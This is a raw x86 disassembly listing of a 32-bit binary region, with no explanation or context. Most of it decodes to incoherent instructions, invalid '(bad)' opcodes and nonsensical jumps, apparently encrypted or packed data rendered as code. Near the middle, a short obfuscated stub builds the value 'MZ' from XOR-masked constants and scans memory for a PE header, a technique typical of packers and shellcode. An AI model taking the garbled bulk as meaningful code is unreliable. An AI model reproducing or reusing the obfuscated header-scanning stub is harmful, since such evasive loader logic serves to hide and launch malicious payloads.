  41bbaf:	rcr    bh,0x9f
  41bbb2:	cmp    eax,0xd2aa0a06
  41bbb7:	cmc    
  41bbb8:	jle    0x41bb65
  41bbba:	stos   DWORD PTR es:[edi],eax
  41bbbb:	mov    al,0x21
  41bbbd:	mov    esp,0xc376dc41
  41bbc2:	jae    0x41bbe6
  41bbc4:	imul   ecx,DWORD PTR [ecx],0x2f
  41bbc7:	test   al,0xa0
  41bbc9:	jmp    0xb09e4d3c
  41bbce:	retf   
  41bbcf:	es dec ecx
  41bbd1:	test   BYTE PTR [ebx],0xd0
  41bbd4:	in     eax,dx
  41bbd5:	sbb    eax,0xae0a8220
  41bbda:	cmp    BYTE PTR [edi-0x55],bh
  41bbdd:	test   al,0xb0
  41bbdf:	test   cl,cl
  41bbe1:	xchg   esp,eax
  41bbe2:	mov    ds:0x578e1486,al
  41bbe7:	imul   eax,DWORD PTR [eax-0x31],0x7ffb9e38
  41bbee:	jae    0x41bba5
  41bbf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbf1:	dec    ecx
  41bbf2:	stos   BYTE PTR es:[edi],al
  41bbf3:	ins    DWORD PTR es:[edi],dx
  41bbf4:	pop    ecx
  41bbf5:	sbb    DWORD PTR [ecx],0x57
  41bbf8:	inc    esp
  41bbf9:	or     eax,DWORD PTR [ecx]
  41bbfb:	dec    edx
  41bbfc:	mov    BYTE PTR [esi],al
  41bbfe:	repz lahf 
  41bc00:	jns    0x41bc47
  41bc02:	sub    BYTE PTR [ebp-0x29],ah
  41bc05:	and    al,0xe8
  41bc07:	adc    bl,BYTE PTR [edi+0x69]
  41bc0a:	daa    
  41bc0b:	cli    
  41bc0c:	outs   dx,BYTE PTR ds:[esi]
  41bc0d:	repz aad 0x7e
  41bc10:	add    al,0x29
  41bc12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc13:	(bad)  
  41bc14:	enter  0x9ad0,0xee
  41bc18:	aam    0x5
  41bc1a:	and    DWORD PTR [ebp+edx*4-0x12f51739],ebx
  41bc21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc22:	xor    esp,esp
  41bc24:	add    eax,edi
  41bc26:	cmp    eax,DWORD PTR [esi]
  41bc28:	adc    ah,cl
  41bc2a:	(bad)  
  41bc2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc2c:	mov    dl,0x34
  41bc2e:	shr    DWORD PTR [eax+0x6ff0438d],cl
  41bc34:	jg     0x41bc9d
  41bc36:	and    BYTE PTR [eax+edx*1+0x3a],dl
  41bc3a:	scas   al,BYTE PTR es:[edi]
  41bc3b:	es push es
  41bc3d:	outs   dx,DWORD PTR ds:[esi]
  41bc3e:	test   al,0xc7
  41bc40:	sbb    BYTE PTR [esi],bl
  41bc42:	xor    DWORD PTR [edi-0x4ac49cd3],edx
  41bc48:	aam    0x4b
  41bc4a:	add    ebp,ebp
  41bc4c:	shr    ch,cl
  41bc4e:	xor    al,0x6f
  41bc50:	fwait
  41bc51:	shr    BYTE PTR [edi+0x16],0xd1
  41bc55:	dec    eax
  41bc56:	ins    DWORD PTR es:[edi],dx
  41bc57:	adc    al,0xfa
  41bc59:	(bad)  
  41bc5b:	popa   
  41bc5c:	mov    eax,edi
  41bc5e:	sbb    BYTE PTR [ebp-0x3144722f],dl
  41bc64:	inc    ecx
  41bc65:	push   0xffffffa8
  41bc67:	dec    ebx
  41bc68:	jecxz  0x41bc26
  41bc6a:	xor    edi,0xf19bfdf3
  41bc70:	xchg   edi,eax
  41bc71:	cmp    ch,BYTE PTR [ecx+0x7a361606]
  41bc77:	paddusb mm4,QWORD PTR gs:[eax]
  41bc7b:	mov    ebx,0xee6eb655
  41bc80:	test   DWORD PTR [edx],0xfd0858f
  41bc86:	jl     0x41bcde
  41bc88:	or     DWORD PTR [esi+edi*2-0x3d],esp
  41bc8c:	jmp    0xc78c:0x5b320ee
  41bc93:	add    cl,BYTE PTR [edi+0x1c]
  41bc96:	sti    
  41bc97:	mov    ecx,DWORD PTR [eax+0x1]
  41bc9a:	adc    bh,BYTE PTR ds:0x359a2d7d
  41bca0:	es push ebp
  41bca2:	mov    edi,0xd49c0b2f
  41bca7:	add    al,0xd4
  41bca9:	jns    0x41bd2a
  41bcab:	sub    eax,ecx
  41bcad:	out    0xed,al
  41bcaf:	ret    
  41bcb0:	add    eax,0x7df82a8c
  41bcb5:	nop
  41bcb6:	sub    esi,DWORD PTR [edx+0x75]
  41bcb9:	or     edx,DWORD PTR [edx-0x128cfc5]
  41bcbf:	cmp    ecx,ecx
  41bcc1:	mov    ch,0x64
  41bcc3:	cmp    DWORD PTR [edx+0x131b5f8c],0xfae0058c
  41bccd:	sub    bl,BYTE PTR [eax+0x37]
  41bcd0:	jg     0xdc5272c7
  41bcd6:	inc    ebx
  41bcd7:	ins    DWORD PTR es:[edi],dx
  41bcd8:	jne    0x41bce4
  41bcda:	push   ecx
  41bcdb:	stc    
  41bcdc:	dec    esi
  41bcdd:	add    BYTE PTR ds:0xe4f47252,ah
  41bce3:	jmp    0xd467:0xbf425dd4
  41bcea:	adc    al,0x18
  41bcec:	add    edx,DWORD PTR [ebp+0x6]
  41bcef:	fwait
  41bcf0:	push   0x5a3e7d8
  41bcf5:	out    0xa,eax
  41bcf7:	(bad)  
  41bcf8:	aam    0x5f
  41bcfa:	arpl   WORD PTR [ecx],bp
  41bcfc:	sub    DWORD PTR [edi],ebp
  41bcfe:	out    0x4e,eax
  41bd00:	inc    DWORD PTR [ecx-0x5c6649c2]
  41bd06:	stc    
  41bd07:	je     0x41bd55
  41bd09:	cmp    BYTE PTR [eax+ecx*2+0xf],cl
  41bd0d:	fiadd  DWORD PTR [edi]
  41bd0f:	pusha  
  41bd10:	mov    bl,0xcd
  41bd12:	jnp    0x41bcc2
  41bd14:	fs dec esp
  41bd16:	pop    ss
  41bd17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd18:	frstor [ecx]
  41bd1a:	xchg   ebp,eax
  41bd1b:	(bad)  
  41bd1c:	jp     0x41bd94
  41bd1e:	or     ebp,0x6e673a83
  41bd24:	fimul  DWORD PTR [eax]
  41bd26:	leave  
  41bd27:	jge    0x41bd16
  41bd29:	shl    BYTE PTR [ecx+0x1821e1bf],1
  41bd2f:	cmc    
  41bd30:	test   eax,0x8d4fdb70
  41bd35:	mov    ecx,0x214e3f64
  41bd3a:	mov    edi,0x3373cffd
  41bd3f:	sbb    BYTE PTR [eax],al
  41bd41:	(bad)  [ebx+0x3b565c92]
  41bd47:	mov    dl,0x49
  41bd49:	in     eax,0x3
  41bd4b:	push   ecx
  41bd4c:	(bad)  
  41bd4d:	cmp    ebp,DWORD PTR [ebp-0x14136e07]
  41bd53:	mov    eax,0x26ea51e
  41bd58:	sub    al,0x60
  41bd5a:	icebp  
  41bd5b:	stos   DWORD PTR es:[edi],eax
  41bd5c:	adc    BYTE PTR [esi],bl
  41bd5e:	add    DWORD PTR [ecx+ebp*2-0x25],esp
  41bd62:	or     eax,0x5143aff9
  41bd67:	fnstenv [edx-0x3121f5f6]
  41bd6d:	jb     0x41bd47
  41bd6f:	gs push esp
  41bd71:	add    DWORD PTR [esi],esp
  41bd73:	scas   eax,DWORD PTR es:[edi]
  41bd74:	inc    esp
  41bd75:	clc    
  41bd76:	push   cs
  41bd77:	adc    eax,0x158f61f4
  41bd7c:	in     al,dx
  41bd7d:	mov    ds:0x146a6c43,al
  41bd82:	outs   dx,BYTE PTR ds:[esi]
  41bd83:	popf   
  41bd84:	pop    edx
  41bd85:	pop    cx
  41bd87:	xchg   edx,eax
  41bd88:	int3   
  41bd89:	int    0xcd
  41bd8b:	(bad)  
  41bd8c:	sahf   
  41bd8d:	and    esp,DWORD PTR fs:[eax+0x44]
  41bd91:	out    0xcb,al
  41bd93:	fisttp WORD PTR [ebx-0x585b4ef0]
  41bd99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd9a:	mov    ecx,0x1d78f095
  41bd9f:	rcr    BYTE PTR [eax+0x59],cl
  41bda2:	imul   edi,DWORD PTR [ecx+eiz*2-0x1b3ee914],0xffffffd6
  41bdaa:	ins    BYTE PTR es:[edi],dx
  41bdab:	push   eax
  41bdac:	(bad)  
  41bdad:	mov    esp,0x7cbe3fb1
  41bdb2:	push   esp
  41bdb3:	xchg   DWORD PTR [ecx+0x7cd5547d],eax
  41bdb9:	test   al,0x49
  41bdbb:	(bad)  
  41bdbc:	push   esp
  41bdbd:	fs (bad) 
  41bdbf:	icebp  
  41bdc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdc1:	out    dx,al
  41bdc2:	sub    eax,0xbc10438c
  41bdc7:	jne    0x41be32
  41bdc9:	mov    edx,0x9bed73c8
  41bdce:	ret    0xd50f
  41bdd1:	scas   al,BYTE PTR es:[edi]
  41bdd2:	push   ebp
  41bdd3:	xor    BYTE PTR [eax+ebp*1],ah
  41bdd6:	jbe    0x41be2b
  41bdd8:	icebp  
  41bdd9:	(bad)  
  41bdda:	xlat   BYTE PTR ds:[ebx]
  41bddb:	mov    WORD PTR [ecx-0x42c980c7],?
  41bde1:	int3   
  41bde2:	jne    0x41be08
  41bde4:	adc    edi,DWORD PTR [esi]
  41bde6:	out    dx,al
  41bde7:	ins    DWORD PTR es:[edi],dx
  41bde8:	dec    eax
  41bde9:	(bad)  
  41bdea:	leave  
  41bdeb:	jg     0x41bd97
  41bded:	jnp    0x41bdf0
  41bdef:	ja     0x41bdfa
  41bdf1:	rcl    DWORD PTR ds:0xd5f78577,1
  41bdf7:	aad    0xf4
  41bdf9:	call   0x3435:0xebd7294f
  41be00:	(bad)  
  41be01:	jmp    0x41be16
  41be03:	jmp    0x41bdb0
  41be05:	rol    DWORD PTR [ecx+esi*4+0x56],1
  41be09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be0a:	or     BYTE PTR [esi],0xe5
  41be0d:	pop    edi
  41be0e:	(bad)  
  41be0f:	mov    ch,0xcf
  41be11:	and    BYTE PTR [edi],0x15
  41be14:	and    ch,BYTE PTR [ecx-0x46496651]
  41be1a:	sti    
  41be1b:	scas   al,BYTE PTR es:[edi]
  41be1c:	xlat   BYTE PTR ds:[ebx]
  41be1d:	push   ebx
  41be1e:	pushf  
  41be1f:	sub    BYTE PTR ss:[ebp+0x27826f47],ch
  41be26:	xor    al,0x23
  41be28:	dec    eax
  41be29:	pop    es
  41be2a:	push   gs
  41be2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be2d:	dec    edx
  41be2e:	inc    ebx
  41be2f:	cwde   
  41be30:	or     eax,0x46f815ce
  41be35:	mov    ecx,0x39087f97
  41be3a:	loope  0x41be2c
  41be3c:	sbb    cl,BYTE PTR ds:0x434d12ed
  41be42:	add    eax,0x2bc4469c
  41be47:	mov    al,ds:0x1f79a5ae
  41be4c:	or     ebp,DWORD PTR [edi+0x7e727fc0]
  41be52:	jno    0x41be1a
  41be54:	mov    DWORD PTR [ecx+0x71],ebp
  41be57:	cmp    ecx,esi
  41be59:	xchg   ebx,eax
  41be5a:	js     0x41be4a
  41be5c:	js     0x41be55
  41be5e:	adc    al,0xa
  41be60:	stos   BYTE PTR es:[edi],al
  41be61:	pop    ebp
  41be62:	mov    esi,0xee45e751
  41be67:	mov    edx,0xa39331ad
  41be6c:	stos   BYTE PTR es:[edi],al
  41be6d:	mov    edx,0xa884da4
  41be72:	fdivr  st(0),st
  41be74:	les    ebx,FWORD PTR [esi-0x3f]
  41be77:	cmp    eax,0x9d39b151
  41be7c:	push   cs
  41be7d:	je     0x41be44
  41be7f:	dec    ebx
  41be80:	inc    ecx
  41be81:	aaa    
  41be82:	sub    DWORD PTR [edx-0x7e3bf82d],ebx
  41be88:	les    edx,FWORD PTR [esi+esi*2+0x5]
  41be8c:	inc    ebp
  41be8d:	repz inc esi
  41be8f:	cmp    cl,BYTE PTR [ebp+0x4c]
  41be92:	mov    ds:0xa96a5037,eax
  41be97:	push   esi
  41be98:	scas   eax,DWORD PTR es:[edi]
  41be99:	call   0x181b468
  41be9e:	ret    0x2c92
  41bea1:	jbe    0x41be49
  41bea3:	stos   BYTE PTR es:[edi],al
  41bea4:	add    eax,0xcc98fd14
  41bea9:	(bad)  
  41beaa:	adc    DWORD PTR [ebx],ecx
  41beac:	jbe    0x41be94
  41beae:	jl     0x41be43
  41beb0:	xor    al,0x18
  41beb2:	lea    ebx,[edi-0x46b51991]
  41beb8:	mov    ds:0xf1330e9e,al
  41bebd:	mov    edi,0xffcd8d08
  41bec2:	sub    edi,esi
  41bec4:	add    DWORD PTR [eax],edi
  41bec6:	jmp    0x41bed1
  41becb:	xor    esi,ecx
  41becd:	add    esi,edx
  41becf:	add    DWORD PTR [eax],esi
  41bed1:	mov    eax,DWORD PTR [ebp-0x8]
  41bed4:	mov    esi,DWORD PTR [ebp-0x10]
  41bed7:	mov    eax,DWORD PTR [eax]
  41bed9:	xor    esi,ecx
  41bedb:	add    esi,0x3272f7
  41bee1:	mov    DWORD PTR [ebp-0x28],0x7097b859
  41bee8:	mov    DWORD PTR [ebp-0x24],ebx
  41beeb:	not    esi
  41beed:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41bef4:	mov    DWORD PTR [ebp-0x2c],ebx
  41bef7:	mov    ebx,DWORD PTR [ebp-0x28]
  41befa:	mov    edi,DWORD PTR [ebp-0x24]
  41befd:	and    eax,esi
  41beff:	mov    esi,0xa145
  41bf04:	xor    bx,si
  41bf07:	mov    esi,0x4131
  41bf0c:	add    bx,si
  41bf0f:	cmp    WORD PTR [eax],bx
  41bf12:	je     0x41bf5c
  41bf18:	mov    edi,DWORD PTR [ebp-0x10]
  41bf1b:	xor    edi,ecx
  41bf1d:	mov    DWORD PTR [ebp-0x28],0x7097b859
  41bf24:	mov    DWORD PTR [ebp-0x24],0xffffffff
  41bf2b:	mov    ebx,0xffcd8d08
  41bf30:	sub    ebx,edi
  41bf32:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41bf39:	add    eax,ebx
  41bf3b:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  41bf42:	mov    edi,DWORD PTR [ebp-0x28]
  41bf45:	mov    ebx,DWORD PTR [ebp-0x24]
  41bf48:	mov    ebx,0xa145
  41bf4d:	xor    di,bx
  41bf50:	add    di,si
  41bf53:	cmp    WORD PTR [eax],di
  41bf56:	jne    0x41bf18
  41bf5c:	mov    edi,DWORD PTR [ebp-0x14]
  41bf5f:	jmp    0x41e319
  41bf64:	retf   0xd5df
  41bf67:	pop    esi
  41bf68:	idiv   BYTE PTR [edx+0x7a]
  41bf6b:	addr16 cmp al,0xf6
  41bf6e:	push   ebx
  41bf6f:	into   
  41bf70:	sbb    DWORD PTR [ebp-0x7a],0x7c00e4cf
  41bf77:	jnp    0x41bf91
  41bf79:	sahf   
  41bf7a:	jnp    0x41bff7
  41bf7c:	jmp    0xceb1:0x3625069e
  41bf83:	or     edi,DWORD PTR [ecx+edx*4]
  41bf86:	and    DWORD PTR [ecx+0x7f],ebp
  41bf89:	mov    cl,0x19
  41bf8b:	ss jp  0x41bfaf
  41bf8e:	push   0xe1bc16c5
  41bf93:	out    0xdc,eax
  41bf95:	test   DWORD PTR [esi+0x43f0de10],eax
  41bf9b:	js     0x41bf98
  41bf9d:	jmp    0xa61:0x66f37ed5
  41bfa4:	ins    BYTE PTR es:[di],dx
  41bfa6:	call   0x76ba6276
  41bfab:	(bad)  
  41bfad:	push   ds
  41bfae:	add    dl,BYTE PTR [ecx+0x4ac583ab]
  41bfb4:	icebp  
  41bfb5:	sar    DWORD PTR [edi],cl
  41bfb7:	cmp    DWORD PTR [edx+eiz*1-0x12881295],eax
  41bfbe:	mov    bh,0xd1
  41bfc0:	mov    ebx,0x773d0be3
  41bfc5:	sbb    bl,BYTE PTR [ecx+0x7570e469]
  41bfcb:	js     0x41bfcf
  41bfcd:	jg     0x41c015
  41bfcf:	or     BYTE PTR [edx],bh
  41bfd1:	jae    0x41c025
  41bfd3:	jl     0x41bffd
  41bfd5:	int    0xb5
  41bfd7:	fcomp  QWORD PTR [edx-0x76d3155f]
  41bfdd:	mov    esi,0xc012fec
  41bfe2:	(bad)
  41bfe5:	mov    WORD PTR [ecx],ss
  41bfe7:	and    BYTE PTR [esi+0x48],ch
  41bfea:	imul   BYTE PTR [ebp+ebp*8+0x61]
  41bfee:	loopne 0x41bff0
  41bff0:	stc    
  41bff1:	pop    esp
  41bff2:	es loope 0x41c054
  41bff5:	call   0xbfabc221
  41bffa:	ds dec edi
  41bffc:	mov    edx,0xf53f6d3
  41c001:	mov    ecx,0x85c8082f
  41c006:	stos   DWORD PTR es:[edi],eax
  41c007:	test   al,0xb8
  41c009:	inc    edi
  41c00a:	fild   WORD PTR [edi+ebx*2]
  41c00d:	lods   eax,DWORD PTR ds:[esi]
  41c00e:	fist   DWORD PTR [esp+eax*2-0x1e]
  41c012:	inc    ebp
  41c013:	es fwait
  41c015:	adc    dh,BYTE PTR [ecx-0x6ff8d2fb]
  41c01b:	test   al,0x58
  41c01d:	stos   BYTE PTR es:[edi],al
  41c01e:	loope  0x41c069
  41c020:	or     dl,BYTE PTR [eax]
  41c022:	xor    eax,0x7fccf794
  41c027:	xchg   edi,eax
  41c028:	test   DWORD PTR [ebp+0x2],edi
  41c02b:	adc    al,0x40
  41c02d:	clc    
  41c02e:	aas    
  41c02f:	pusha  
  41c030:	stos   BYTE PTR es:[edi],al
  41c031:	cdq    
  41c032:	adc    eax,0x69f32453
  41c037:	jmp    0x2ba9fde7
  41c03c:	pop    ds
  41c03d:	fstp   TBYTE PTR [esi-0x3ea3cb34]
  41c043:	std    
  41c044:	xchg   ecx,eax
  41c045:	imul   esi,DWORD PTR [ebp+ecx*4-0x33fe97a8],0xffffff83
  41c04d:	nop
  41c04e:	push   0xe6febe31
  41c053:	add    ecx,DWORD PTR [eax+0x2cd60d95]
  41c059:	adc    edx,DWORD PTR [eax-0x4f]
  41c05c:	and    BYTE PTR [esi],cl
  41c05e:	pop    ebx
  41c05f:	xor    ecx,DWORD PTR [edi]
  41c061:	xchg   ebx,eax
  41c062:	cmp    al,0x41
  41c064:	xor    esp,ebx
  41c066:	icebp  
  41c067:	sbb    ah,ch
  41c069:	shl    DWORD PTR [esi-0x3e],0xdc
  41c06d:	push   edi
  41c06e:	dec    ebx
  41c06f:	mov    ecx,0x7a762cd8
  41c074:	shl    ecx,0xb2
  41c077:	fcmove st,st(5)
  41c079:	mov    DWORD PTR [esi+0x3dac588b],ecx
  41c07f:	jmp    0x41c080
  41c081:	loopne 0x41c038
  41c083:	jmp    0x14997ceb
  41c088:	lock scas eax,DWORD PTR es:[edi]
  41c08a:	les    edi,FWORD PTR [edi-0x3a32c800]
  41c090:	loopne 0x41c0c2
  41c092:	xor    eax,0x1df7fcc5
  41c097:	ss jnp 0x41c03c
  41c09a:	int    0x2b
  41c09c:	and    eax,0x8f9c1840
  41c0a1:	cdq    
  41c0a2:	xor    bh,BYTE PTR [esi]
  41c0a4:	add    DWORD PTR [edx+0x66],edi
  41c0a7:	or     cl,cl
  41c0a9:	mov    DWORD PTR [esi+0x6a],ecx
  41c0ac:	cli    
  41c0ad:	mov    edi,0x84fb2421
  41c0b2:	or     al,0x30
  41c0b4:	cmp    BYTE PTR [ebx+0x7f],ch
  41c0b7:	mov    bl,0xbe
  41c0b9:	and    bl,BYTE PTR [esi-0x1490afe0]
  41c0bf:	sub    dh,bl
  41c0c1:	sub    eax,0x5c26240c
  41c0c6:	(bad)  
  41c0c7:	or     al,0xb0
  41c0c9:	inc    esp
  41c0ca:	xchg   esp,eax
  41c0cb:	stos   BYTE PTR es:[edi],al
  41c0cc:	enter  0x614f,0x9f
  41c0d0:	sti    
  41c0d1:	xchg   edi,eax
  41c0d2:	mov    eax,0xa4e0700f
  41c0d7:	and    cl,BYTE PTR [ecx]
  41c0d9:	mov    ch,0xdf
  41c0db:	addr16 mov bl,0x18
  41c0de:	inc    esp
  41c0df:	dec    edi
  41c0e0:	(bad)  
  41c0e1:	enter  0xe86e,0xf7
  41c0e5:	js     0x41c13a
  41c0e7:	pop    ebp
  41c0e8:	add    dh,al
  41c0ea:	mov    edi,0xde06cb8d
  41c0ef:	push   ecx
  41c0f0:	xor    ebp,ecx
  41c0f2:	inc    ebp
  41c0f3:	pop    es
  41c0f4:	sub    BYTE PTR [esi+0x76cb29a2],0x23
  41c0fb:	or     ebp,DWORD PTR [esi]
  41c0fd:	(bad)  
  41c0fe:	sub    esp,esi
  41c100:	inc    ebp
  41c101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c102:	ret    
  41c103:	fs push cs
  41c105:	aam    0xf1
  41c107:	push   cs
  41c108:	jnp    0x41c14b
  41c10a:	or     al,0x40
  41c10c:	in     eax,dx
  41c10d:	inc    ebx
  41c10e:	aaa    
  41c10f:	arpl   WORD PTR [esi+0x67],si
  41c112:	xchg   edx,eax
  41c113:	adc    dh,BYTE PTR [esi+0x48b08a4e]
  41c119:	cdq    
  41c11a:	push   ds
  41c11b:	pop    edx
  41c11c:	stos   DWORD PTR es:[edi],eax
  41c11d:	std    
  41c11e:	dec    eax
  41c11f:	mov    esp,0xa2115bc2
  41c124:	jl     0x41c0b1
  41c126:	jmp    0x46d7:0xf804d243
  41c12d:	xor    BYTE PTR [eiz*8+0x616aebe5],bh
  41c134:	out    dx,eax
  41c135:	scas   eax,DWORD PTR es:[edi]
  41c136:	stc    
  41c137:	mov    esi,0x703f780c
  41c13c:	push   esp
  41c13d:	sahf   
  41c13e:	ins    DWORD PTR es:[edi],dx
  41c13f:	mov    ecx,0xdb2998ee
  41c144:	xor    al,0xd2
  41c146:	rcr    BYTE PTR [esp+ecx*8-0x47fbc24f],cl
  41c14d:	sub    BYTE PTR [esi-0xf018dcd],cl
  41c153:	mov    cl,0xa9
  41c155:	out    0x7,al
  41c157:	jns    0x41c124
  41c159:	push   ds
  41c15a:	jge    0x41c0dd
  41c15c:	mov    cl,0x1a
  41c15e:	xor    ch,ah
  41c160:	xor    DWORD PTR [ebx-0x7f],edi
  41c163:	sub    edi,DWORD PTR [ecx+edi*8+0x26fd23c8]
  41c16a:	lds    edi,FWORD PTR [esi+0x2c096ea4]
  41c170:	pop    edx
  41c171:	or     eax,0xb402f698
  41c176:	fisttp QWORD PTR [ecx+0x5850b38]
  41c17c:	jbe    0x41c1d8
  41c17e:	dec    edx
  41c17f:	dec    edi
  41c180:	mov    fs,WORD PTR [ebp-0x41536bef]
  41c186:	mov    ecx,0x9d5b2372
  41c18b:	mov    fs,ebx
  41c18d:	xchg   DWORD PTR [edi+ebx*2-0x66875ea5],ebx
  41c194:	push   ecx
  41c195:	ds stc 
  41c197:	je     0x41c1e4
  41c199:	mov    ds:0x7b0e5cc,al
  41c19e:	shl    BYTE PTR [ebp+0x71],1
  41c1a1:	scas   al,BYTE PTR es:[edi]
  41c1a2:	pop    ecx
  41c1a3:	leave  
  41c1a4:	cld    
  41c1a5:	sahf   
  41c1a6:	call   0x6b9b:0x9adfe228
  41c1ad:	rol    BYTE PTR [ecx-0x8],1
  41c1b0:	jae    0x41c13b
  41c1b2:	sti    
  41c1b3:	or     DWORD PTR [ebx-0x3d018d01],ebx
  41c1b9:	pop    esi
  41c1ba:	cmp    esp,edi
  41c1bc:	aas    
  41c1bd:	jmp    0x9dd39cc
  41c1c2:	push   0xffffffb6
  41c1c4:	pop    ds
  41c1c5:	(bad)  
  41c1c6:	mov    WORD PTR [ecx],?
  41c1c8:	xor    al,0xde
  41c1ca:	mov    ch,0xab
  41c1cc:	pop    esp
  41c1cd:	pushf  
  41c1ce:	jmp    0x41c166
  41c1d0:	xor    ecx,esp
  41c1d2:	sbb    edi,edx
  41c1d4:	outs   dx,BYTE PTR ds:[esi]
  41c1d5:	mov    edi,edx
  41c1d7:	retf   0xdb29
  41c1da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1db:	inc    edi
  41c1dc:	mov    edx,0x7a750f92
  41c1e1:	add    edi,DWORD PTR [eax]
  41c1e3:	jo     0x41c171
  41c1e5:	xor    bh,BYTE PTR [edi+ebp*1-0x63]
  41c1e9:	into   
  41c1ea:	imul   DWORD PTR [ebx]
  41c1ec:	adc    DWORD PTR [ebx],edi
  41c1ee:	jae    0x41c1b9
  41c1f0:	add    esp,ebp
  41c1f2:	mov    dh,0xb4
  41c1f4:	add    eax,esi
  41c1f6:	stos   DWORD PTR es:[edi],eax
  41c1f7:	adc    DWORD PTR [ecx+0x6c],ebp
  41c1fa:	aas    
  41c1fb:	fcom   DWORD PTR [ebx+ebx*1+0x1f]
  41c1ff:	and    DWORD PTR ds:0x867c9a72,ebx
  41c205:	inc    edx
  41c206:	cld    
  41c207:	xor    DWORD PTR [ecx+esi*8-0x4],edx
  41c20b:	lahf   
  41c20c:	inc    ecx
  41c20d:	sbb    ch,cl
  41c20f:	inc    edi
  41c210:	xor    eax,0x32e74b26
  41c215:	mov    dl,0xa5
  41c217:	bound  edx,QWORD PTR [ebx-0x24d613b6]
  41c21d:	jmp    0x41c21a
  41c21f:	ins    BYTE PTR es:[edi],dx
  41c220:	pop    ebx
  41c221:	mov    ds:0x6aec47ec,al
  41c226:	jmp    0x41c1bf
  41c228:	or     BYTE PTR [edi-0xb4e0852],bh
  41c22e:	fwait
  41c22f:	pop    ds
  41c230:	mov    ebx,0x23d06a79
  41c235:	imul   edx,DWORD PTR [esi+0x31c286c7],0x7df54aa2
  41c23f:	in     al,dx
  41c240:	loope  0x41c1dd
  41c242:	or     eax,0xef351804
  41c247:	jno    0x41c2c1
  41c249:	push   edi
  41c24a:	push   edi
  41c24b:	retf   
  41c24c:	pop    es
  41c24d:	sub    BYTE PTR [eax+0xc15d78a],ah
  41c253:	pop    ebx
  41c254:	add    DWORD PTR [edi+0xe441c1d],edx
  41c25a:	lea    ebx,[edx]
  41c25c:	es inc edx
  41c25e:	push   ebx
  41c260:	out    dx,eax
  41c261:	(bad)  [esi-0x5227abb2]
  41c267:	jl     0x41c22f
  41c269:	into   
  41c26a:	dec    ebx
  41c26b:	mov    esi,0x8ffe2992
  41c270:	es adc al,cl
  41c273:	or     DWORD PTR [ecx+0x40],eax
  41c276:	out    0x90,eax
  41c278:	dec    ebx
  41c279:	lock mov ch,0x78
  41c27c:	outs   dx,BYTE PTR ds:[esi]
  41c27d:	push   0xf168e3a3
  41c282:	mov    ecx,0x85a348fb
  41c287:	sub    edi,edi
  41c289:	dec    esp
  41c28a:	sbb    al,0x94
  41c28c:	xchg   DWORD PTR [eax],ebx
  41c28e:	hlt    
  41c28f:	jl     0x41c22d
  41c291:	jge    0x41c221
  41c293:	arpl   WORD PTR [ebx+0x1d88a5a9],sp
  41c299:	inc    ecx
  41c29a:	hlt    
  41c29b:	into   
  41c29c:	adc    al,0xe9
  41c29e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c29f:	les    eax,FWORD PTR [ebx-0x3f]
  41c2a2:	sub    eax,0x95014c1b
  41c2a7:	shl    bh,0xd1
  41c2aa:	es inc esp
  41c2ac:	loop   0x41c26c
  41c2ae:	mov    dl,0x17
  41c2b0:	outs   dx,DWORD PTR ds:[esi]
  41c2b1:	cmp    BYTE PTR [ecx],0xb
  41c2b4:	mov    ?,WORD PTR [ecx+ebp*2-0x5f]
  41c2b8:	(bad)  
  41c2b9:	sub    eax,0x1f0daec7
  41c2be:	jb     0x41c2d5
  41c2c0:	shr    BYTE PTR [edx],0xb4
  41c2c3:	xchg   esi,eax
  41c2c4:	ficom  DWORD PTR [edi]
  41c2c6:	dec    eax
  41c2c7:	pop    edi
  41c2c8:	or     al,0x83
  41c2ca:	ret    
  41c2cb:	enter  0x6d2c,0x78
  41c2cf:	inc    edi
  41c2d0:	inc    edi
  41c2d1:	sbb    ch,BYTE PTR [edi]
  41c2d3:	in     eax,dx
  41c2d4:	adc    DWORD PTR [edx],ebp
  41c2d6:	inc    ebp
  41c2d7:	xor    eax,0xaf2b898f
  41c2dc:	clc    
  41c2dd:	stc    
  41c2de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2df:	test   DWORD PTR [esi-0x16],ebp
  41c2e2:	fmul   QWORD PTR [esi+ebp*2+0x7c]
  41c2e6:	inc    edx
  41c2e7:	sub    bh,al
  41c2e9:	sbb    eax,0xed3e3f66
  41c2ee:	lahf   
  41c2ef:	adc    BYTE PTR [eax+0x37],ah
  41c2f2:	pop    esi
  41c2f3:	inc    ebx
  41c2f4:	fmul   QWORD PTR [ecx-0x24]
  41c2f7:	jbe    0x41c33d
  41c2f9:	fldcw  WORD PTR ds:0x84379dc
  41c2ff:	xchg   edx,eax
  41c300:	jp     0x41c2d7
  41c302:	lahf   
  41c303:	(bad)  
  41c304:	out    0xfb,eax
  41c306:	(bad)  [esp+edx*1]
  41c309:	in     al,dx
  41c30a:	mov    ebp,0x91797f80
  41c30f:	cwde   
  41c310:	push   cs
  41c311:	jns    0x41c324
  41c313:	jns    0x41c37f
  41c315:	(bad)  
  41c316:	out    0x69,eax
  41c318:	(bad)  [eax]
  41c31a:	in     eax,0xe0
  41c31c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c31d:	and    bh,dh
  41c31f:	ins    BYTE PTR es:[edi],dx
  41c320:	lds    esp,FWORD PTR [ebp+0x5d]
  41c323:	push   ebp
  41c324:	js     0x41c398
  41c326:	addr16 pushf 
  41c328:	(bad)  
  41c32a:	imul   ebx,ecx,0x1c
  41c32d:	test   bl,ah
  41c32f:	(bad)  
  41c331:	mov    dh,bh
  41c333:	push   es
  41c334:	mov    BYTE PTR [edx+0x13],al
  41c337:	jns    0x41c328
